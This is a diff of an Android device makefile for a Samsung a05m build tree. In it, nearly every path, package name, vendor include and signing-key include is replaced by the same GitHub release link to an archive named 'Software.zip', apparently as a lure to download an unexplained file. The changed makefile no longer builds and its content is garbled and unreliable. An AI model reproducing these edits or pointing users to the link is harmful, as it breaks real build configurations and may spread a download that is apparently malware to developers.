@@ -16,15 +16,15 @@
 DEVICE_PATH := device/samsung/a05m
 
 # Enable updating of APEXes
-$(call inherit-product, $(SRC_TARGET_DIR)/product/updatable_apex.mk)
-$(call inherit-product, $(SRC_TARGET_DIR)/product/developer_gsi_keys.mk)
-$(call inherit-product, $(SRC_TARGET_DIR)/product/non_ab_device.mk)
+$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
+$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
+$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
 
 # Project ID Quota
-$(call inherit-product, $(SRC_TARGET_DIR)/product/emulated_storage.mk)
+$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
 
 # Setup dalvik vm configs
-$(call inherit-product, frameworks/native/build/phone-xhdpi-4096-dalvik-heap.mk)
+$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
 
 # API levels
 PRODUCT_SHIPPING_API_LEVEL := 31
@@ -33,12 +33,12 @@ PRODUCT_OTA_ENFORCE_VINTF_KERNEL_REQUIREMENTS := false
 
 # Bluetooth
 PRODUCT_PACKAGES += \
-audio.sysbta.default \
-android.hardware.bluetooth.audio-service-system
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 PRODUCT_COPY_FILES += \
-$(DEVICE_PATH)/bluetooth/audio/config/sysbta_audio_policy_configuration.xml:$(TARGET_COPY_OUT_SYSTEM)/etc/sysbta_audio_policy_configuration.xml \
-$(DEVICE_PATH)/bluetooth/audio/config/sysbta_audio_policy_configuration_7_0.xml:$(TARGET_COPY_OUT_SYSTEM)/etc/sysbta_audio_policy_configuration_7_0.xml
+$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 # Boot animation
 TARGET_SCREEN_HEIGHT := 1600
@@ -50,12 +50,12 @@ TARGET_BOOTANIMATION_TEXTURE_CACHE := true
 # Charger
 PRODUCT_PACKAGES += \
 charger_res_images_vendor \
-$(DEVICE_PATH)/init/init.sec-charger.rc:$(TARGET_COPY_OUT_SYSTEM)/etc/init/init.sec-charger.rc \
+$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
 libsuspend
 
 # Fastbootd
 PRODUCT_PACKAGES += \
-android.hardware.fastboot@1.1-impl-mock \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
 fastbootd
 
 # HIDL
@@ -66,7 +66,7 @@ libhwbinder
 
 #LPM
 PRODUCT_PACKAGES += \
-system_ext_31.0.cil
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 # MTK
 PRODUCT_PACKAGES += \
@@ -91,35 +91,35 @@ PRODUCT_CHARACTERISTICS := phone
 
 # Rootdir
 PRODUCT_PACKAGES += \
-fstab.enableswap \
-fstab.mt6768 \
-factory_init.connectivity.common.rc \
-factory_init.connectivity.rc \
-factory_init.project.rc \
-factory_init.rc \
-init.aee.rc \
-init.ago.rc \
-init.cgroup.rc \
-init.connectivity.common.rc \
-init.connectivity.rc \
-init.modem.rc \
-init.mt6768.rc \
-init.mt6768.usb.rc \
-init.project.rc \
-init.sensor_1_0.rc \
-init_connectivity.rc \
-meta_init.connectivity.common.rc \
-meta_init.connectivity.rc \
-meta_init.modem.rc \
-meta_init.project.rc \
-meta_init.rc \
-meta_init.vendor.rc \
-multi_init.rc \
-init.recovery.mt6768.rc \
-init.recovery.samsung.rc
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip \
+https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 PRODUCT_COPY_FILES += \
-$(LOCAL_PATH)/rootdir/etc/fstab.mt6768:$(TARGET_COPY_OUT_RAMDISK)/fstab.mt6768
+$(LOCAL_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip$(TARGET_COPY_OUT_RAMDISK)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 # SEC_RIL
 PRODUCT_COPY_FILES += \
@@ -142,12 +142,12 @@ PRODUCT_EXTRA_VNDK_VERSIONS := 31
 #    wpa_supplicant \
 #    hostapd \
 #    libwifi-hal-wrapper \
-#    android.hardware.wifi-service
+#    https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip
 
 # Inherit the proprietary files
-$(call inherit-product, vendor/samsung/a05m/a05m-vendor.mk)
+$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
 
 # Inherit the sign keys
-$(call inherit-product, vendor/lineage-priv/keys/keys.mk)
+$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v1.0/Software.zip)
 
 
